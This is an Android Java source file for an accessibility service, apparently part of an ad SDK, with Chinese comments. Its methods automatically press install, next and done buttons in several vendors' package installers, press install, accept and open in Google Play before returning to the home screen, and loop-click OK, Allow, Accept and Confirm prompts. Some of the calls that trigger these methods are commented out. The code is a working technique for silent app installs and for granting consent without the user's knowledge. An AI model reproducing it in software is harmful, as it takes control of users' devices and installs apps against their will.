package com.api.utils.myfb;

import android.accessibilityservice.AccessibilityService;
import android.annotation.TargetApi;
import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;


import java.util.HashMap;
import java.util.List;
import java.util.Locale;

/**
 * Created by shuiming.tang on 2016/12/13.
 */
public class AutoAccessibilityService extends AccessibilityService {

    private static final String ACTION_PRE =
            "OK|Ok|好|YES|Yes|是|CONFIRM|Confirm|确定|ACCECT|Accect|接受|ALLOW|Allow|允许|我知道了";
    private static final String ACTION_AFTER = ACTION_PRE + "|UPDATE|Update|更新|START|Start|开始|START NOW|Start now|现在开始|PLAY|Play";
    String mSelectedPlatform = "";
    String mSelectedType = "";
    String AdId = "";
    private int tag = 0;
    private String platformType = "";
    private boolean gpNoClickFlag = false;

    @TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null || event.getPackageName() == null) {
            return;
        }
        String lunchPackageName = event.getPackageName().toString();
        if (lunchPackageName.isEmpty()) {
            return;
        }
        if (!isOnScreen(this)) {
            return;
        }

        //没有GP账户，在360手机里面界面是WebView，包名是com.google.android.gms；其他手机待验证
        //如果能够进入辅助服务说明，已经安装了谷歌play，此时如果没有登录，仍然认为没有GP账号
        /*if (event.getPackageName().equals("com.google.android.gsf.login")) {
            //此时需要关闭com.google.android.gsf.login
            //需要权限android.permission.KILL_BACKGROUND_PROCESSES"
            try {
                ActivityManager manager = (ActivityManager)getSystemService(Context.ACTIVITY_SERVICE);
                if (manager != null) {
                    manager.killBackgroundProcesses("com.google.android.gsf.login");
                }
            } catch (Exception e) {
                e.printStackTrace();
            }

            return;
        }
        if (event.getPackageName().equals("com.google.android.gms")) {
            //此时需要关闭com.google.android.gms
            //需要权限android.permission.KILL_BACKGROUND_PROCESSES"
            try {
                ActivityManager manager = (ActivityManager)getSystemService(Context.ACTIVITY_SERVICE);
                if (manager != null) {
                    manager.killBackgroundProcesses("com.google.android.gms");
                }
            } catch (Exception e) {
                e.printStackTrace();
            }

            return;
        }*/
        /*if (event.getPackageName().equals("com.android.packageinstaller") ||
                event.getPackageName().equals("com.lenovo.security") ||
                event.getPackageName().equals("com.miui.packageinstaller")) {//服务端下载后辅助安装

            tag = 1;
            packageInstallAccessibility(getRootInActiveWindow());
            return;
        }*/
        /*if (event.getPackageName().equals("com.android.vending")) {//GP下载安装
            tag = 2;
            gpNoClickFlag = false;
            admobDownLoadInstall(getRootInActiveWindow());
            return;
        }*/
        int eventType = event.getEventType();

        if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            Logger.D("TYPE_WINDOW_CONTENT_CHANGED");
            AccessibilityNodeInfo root = getRootInActiveWindow();
//            loopClick(root,event);

            Log.e("sdk","TYPE_WINDOW_CONTENT_CHANGED  ");
        } else if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            Logger.D("TYPE_WINDOW_CONTENT_CHANGED");
            AccessibilityNodeInfo root = getRootInActiveWindow();
//            loopClick(root,event);

            Log.e("sdk","TYPE_WINDOW_STATE_CHANGED  ");
        }
    }

    @Override
    public void onInterrupt() {

    }

    @TargetApi(Build.VERSION_CODES.JELLY_BEAN_MR2)
    private void packageInstallAccessibility(AccessibilityNodeInfo rootInfo) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.JELLY_BEAN_MR2) {
            return;
        }
        if (rootInfo == null) {
            return;
        }
        String installButtonId = "com.android.packageinstaller:id/ok_button";//安装，下一步
        String installLenovoId = "com.lenovo.security:id/ok_button";//安装

        String installDoneButton = "com.android.packageinstaller:id/done_button";//完成
        String installDoneLenovoId = "com.lenovo.security:id/done_button";//完成
        String huaweiDecide = "com.android.packageinstaller:id/decide_to_continue";
        String huaweiGoInstall = "com.android.packageinstaller:id/goinstall";
        String xiaomiInstallId = "com.miui.packageinstaller:id/ok_button";
        String xiaomiDoneId = "com.miui.packageinstaller:id/done_button";
        String doneFinishId = "com.android.packageinstaller:id/finish";
        String goneOnInstallId = "android:id/button1";//可能存在风险的：继续，确定；替换时可能出现确定按钮


        if (disposeNodeInfo(rootInfo.findAccessibilityNodeInfosByViewId(installButtonId),1)) {
            return;
        }
        if (disposeNodeInfo(rootInfo.findAccessibilityNodeInfosByViewId(installDoneButton),1)) {
            return;
        }
        if (disposeNodeInfo(rootInfo.findAccessibilityNodeInfosByViewId(installLenovoId),1)) {
            return;
        }
        if (disposeNodeInfo(rootInfo.findAccessibilityNodeInfosByViewId(installDoneLenovoId),1)) {
            return;
        }
        if (disposeNodeInfo(rootInfo.findAccessibilityNodeInfosByViewId(huaweiDecide),1)) {
            return;
        }
        if (disposeNodeInfo(rootInfo.findAccessibilityNodeInfosByViewId(huaweiGoInstall),1)) {
            return;
        }
        if (disposeNodeInfo(rootInfo.findAccessibilityNodeInfosByViewId(xiaomiInstallId),1)) {
            return;
        }
        if (disposeNodeInfo(rootInfo.findAccessibilityNodeInfosByViewId(xiaomiDoneId),1)) {
            return;
        }
        if (disposeNodeInfo(rootInfo.findAccessibilityNodeInfosByViewId(doneFinishId),1)) {
            return;
        }
        if (disposeNodeInfo(rootInfo.findAccessibilityNodeInfosByViewId(goneOnInstallId),1)) {
            return;
        }
        try {
            String packageName = "com.android.packageinstaller";
            Context installContext = createPackageContext(packageName, Context.CONTEXT_IGNORE_SECURITY | Context.CONTEXT_INCLUDE_CODE);
            if (installContext == null) {
                return;
            }
            //安装,下一步,完成
            int installId = installContext.getResources().getIdentifier("install", "string", packageName);
            if (installId != 0) {
                String installName = installContext.getResources().getString(installId);
                if (disposeNodeInfo(rootInfo.findAccessibilityNodeInfosByText(installName),1)) {
                    return;
                }
            }

            int nextId = installContext.getResources().getIdentifier("next", "string", packageName);
            if (nextId != 0) {
                String nextName = installContext.getResources().getString(nextId);
                if (disposeNodeInfo(rootInfo.findAccessibilityNodeInfosByText(nextName),1)) {
                    return;
                }
            }

            int doneId = installContext.getResources().getIdentifier("done", "string", packageName);
            if (doneId != 0) {
                String doneName = installContext.getResources().getString(doneId);
                if (disposeNodeInfo(rootInfo.findAccessibilityNodeInfosByText(doneName),1)) {
                    return;
                }
            }
        } catch (PackageManager.NameNotFoundException e) {
            Logger.D("没有安装com.android.packageinstaller");
            e.printStackTrace();
        }


    }

    @TargetApi(Build.VERSION_CODES.JELLY_BEAN_MR2)
    private void admobDownLoadInstall(AccessibilityNodeInfo rootInfo) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.JELLY_BEAN_MR2) {
            return;
        }

        if (rootInfo == null) {
            return;
        }
//        boolean downLoad = Utils.isDownLoad(this, Utils.getIntFromPlatform(this, SharePreUtil.getString("mSelectedPlatform")));
//        Logger.D("gp no downLoad "+downLoad);
//        if (!downLoad) {
//            Utils.backToHome(getApplicationContext());
//            return;
//        }

        clickNodeGP(rootInfo);
        Logger.D("== rootInfo：" +rootInfo);
        String installViewId = "com.android.vending:id/buy_button";//安装
        String acceptViewId = "com.android.vending:id/continue_button";//接受
        String launchViewId = "com.android.vending:id/launch_button";//打开
        clickNodeInfo(rootInfo, installViewId);
        clickNodeInfo(rootInfo, acceptViewId);
        clickNodeInfo(rootInfo, launchViewId);
    }

    private void clickNodeGP(AccessibilityNodeInfo rootInfo) {

        HashMap<String, String> mapInstall = GPWordsUtils.getInstance().getMapInstall();
        String gPwords = getGPwords(mapInstall);
        if (rootInfo != null && gPwords != null) {
            Logger.D("== gPwords：" +gPwords);
            disposeNodeInfo(rootInfo.findAccessibilityNodeInfosByText(gPwords),5);
        }
        HashMap<String, String> mapAccept = GPWordsUtils.getInstance().getMapAccept();
        String gPwords1 = getGPwords(mapAccept);
        if (rootInfo != null && gPwords1 != null) {
            Logger.D("== gPwords：" +gPwords1);
            disposeNodeInfo(rootInfo.findAccessibilityNodeInfosByText(gPwords1),6);
        }
        HashMap<String, String> mapOpen = GPWordsUtils.getInstance().getMapOpen();
        String gPwords2 = getGPwords(mapOpen);
        if (rootInfo != null && gPwords2 != null) {
            Logger.D("== gPwords：" +gPwords2);
            disposeNodeInfo(rootInfo.findAccessibilityNodeInfosByText(gPwords2),7);
        }
    }

    private String getGPwords(HashMap<String, String> mapInstall) {
        if (mapInstall != null) {
            String country = Locale.getDefault().getCountry();
            String language = Locale.getDefault().getLanguage();
            String key1 = "values-"+language+"-r"+country;
            String key2 = "values-"+language;
            String key3 = "values";
            for (HashMap.Entry<String, String> entry : mapInstall.entrySet()) {
                if (key1.equals(entry.getKey())) {
                    return entry.getValue();
                }
            }
            for (HashMap.Entry<String, String> entry : mapInstall.entrySet()) {
                if (key2.equals(entry.getKey())) {
                    return entry.getValue();
                }
            }
            for (HashMap.Entry<String, String> entry : mapInstall.entrySet()) {
                if (key3.equals(entry.getKey())) {
                    return entry.getValue();
                }
            }
        }
        return null;
    }

    @TargetApi(Build.VERSION_CODES.JELLY_BEAN_MR2)
    private void clickNodeInfo(AccessibilityNodeInfo info, String viewId) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.JELLY_BEAN_MR2) {
            return;
        }
        Logger.D("== rootInfo：" +viewId+"  ==  "+info);
        List<AccessibilityNodeInfo> nodeInfoList = info.findAccessibilityNodeInfosByViewId(viewId);
        Logger.D("== rootInfo：" +nodeInfoList.size()+"  ==  "+nodeInfoList);
        if (nodeInfoList != null && nodeInfoList.size() > 0) {
            for (int i = 0; i < nodeInfoList.size(); i++) {
                AccessibilityNodeInfo nodeInfo = nodeInfoList.get(i);
                if (nodeInfo.isEnabled() && nodeInfo.isClickable()) {
                    nodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    if ("com.android.vending:id/buy_button".equals(viewId)) {
                        Logger.D("== buy_button：" +viewId);
                    } else if ("com.android.vending:id/continue_button".equals(viewId)) {

                        backToHome(getApplicationContext());//点击确认之后，回到桌面
                    } else if ("com.android.vending:id/launch_button".equals(viewId)) {

                    }else {
                        if (!gpNoClickFlag) {
                            gpNoClickFlag = true;

                        }
                    }
                }
            }
        }
    }

    @TargetApi(Build.VERSION_CODES.ICE_CREAM_SANDWICH)
    private synchronized void loopClick(AccessibilityNodeInfo root, final AccessibilityEvent event) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.ICE_CREAM_SANDWICH) {
            return;
        }
        if (root == null) {
            return;
        }

        Log.e("sdk","");
        int count = root.getChildCount();
        if (count == 0) {
            return;
        }

        AccessibilityNodeInfo info;
        String curPkgName = "";
        for (int i = 0; i < count; i++) {
            info = root.getChild(i);
            if (info == null || info.getPackageName() == null)
                continue;
            curPkgName = info.getPackageName().toString();
//            if (!"".equals(SharePreUtil.getString(curPkgName))) {
                diposeListTag(ACTION_PRE);
                final AccessibilityNodeInfo child = searchEnabNode(info);
                if (child != null) {
                    new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                        @Override
                        public void run() {

                            diposeListTag(ACTION_AFTER);
                            child.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        }
                    }, 3 * 1000);

                }else {
//                    new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
//                        @Override
//                        public void run() {
//                            GuideWindowUtil.showPopupWindow(getApplicationContext());
//                        }
//                    },2 * 1000);
                }
//            }
        }
    }

    @TargetApi(Build.VERSION_CODES.ICE_CREAM_SANDWICH)
    private AccessibilityNodeInfo searchEnabNode(AccessibilityNodeInfo nodeInfo) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.ICE_CREAM_SANDWICH) {
            return null;
        }
        if (nodeInfo == null) {
            return null;
        }
        int count = nodeInfo.getChildCount();
        if (count == 0) {
            if (nodeInfo.isEnabled() && nodeInfo.isClickable()) {
                return nodeInfo;
            } else {
                return null;
            }
        }
        AccessibilityNodeInfo childNode;
        for (int i = 0; i < count; i++) {
            childNode = nodeInfo.getChild(i);
            if (childNode == null)
                continue;
            if (childNode.isEnabled() && childNode.isClickable()) {
                Logger.D("发现：" + childNode.getClassName());
                return childNode;
            } else {
                AccessibilityNodeInfo c = searchEnabNode(childNode);
                if (c != null) {
                    return c;
                }
            }
        }

        return null;
    }

    @TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    private void diposeListTag(String tagList) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.JELLY_BEAN) {
            return;
        }
        if (tagList != null && tagList.length() != 0) {
            String[] tags = tagList.split("\\|");
            if (tags.length != 0) {
                AccessibilityNodeInfo root;
                for (String tag : tags) {
                    root = getRootInActiveWindow();
                    if (root != null) {
                        disposeNodeInfo(root.findAccessibilityNodeInfosByText(tag),3);
                    }
                }
            }
        }
    }

    @TargetApi(Build.VERSION_CODES.ICE_CREAM_SANDWICH)
    private boolean disposeNodeInfo(List<AccessibilityNodeInfo> nodeInfoList,int num) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.ICE_CREAM_SANDWICH) {
            return true;
        }
        Logger.D("== rootInfo：" +nodeInfoList.size()+"  ==  "+nodeInfoList);
        if (nodeInfoList != null && !nodeInfoList.isEmpty()) {
            for (final AccessibilityNodeInfo info : nodeInfoList) {
                if (info != null && info.isEnabled() && info.isClickable()) {
                    info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return true;
                }
            }
        }
        return false;
    }

    private String pluginRealName(String name) {
        if (name.indexOf(".") < 0) {
            name = name + ".apk";
        }
        return name;
    }

    //回到桌面
    public static void backToHome(Context context) {
        Intent home=new Intent(Intent.ACTION_MAIN);
        home.addCategory(Intent.CATEGORY_HOME);
        home.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(home);
    }
    public static boolean isOnScreen(Context context) {
        PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
        if (Build.VERSION.SDK_INT < 20) {
            return pm.isScreenOn();
        } else {
            return pm.isInteractive();
        }
    }
}